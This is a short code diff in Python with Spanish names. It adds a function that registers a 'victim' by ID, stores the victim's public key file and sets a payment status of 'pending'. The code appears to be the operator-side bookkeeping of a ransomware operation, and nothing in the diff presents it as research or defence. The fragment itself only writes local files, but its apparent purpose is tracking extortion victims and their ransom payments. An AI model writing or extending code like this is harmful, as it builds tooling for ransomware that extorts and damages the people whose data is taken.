@@ -17,6 +17,17 @@ def incorporar():
         (destino / "pago").write_text("pendiente")
 
 
+def anotar_victima(id_v, pk_v):
+    destino = REGISTRO / "incidentes" / id_v.hex()
+    pk_ruta = destino / "pkV.der"
+    if pk_ruta.is_file():
+        return False
+    destino.mkdir(parents=True, exist_ok=True)
+    pk_ruta.write_bytes(pk_v)
+    (destino / "pago").write_text("pendiente")
+    return True
+
+
 def guardados():
     base = REGISTRO / "incidentes"
     if not base.is_dir():
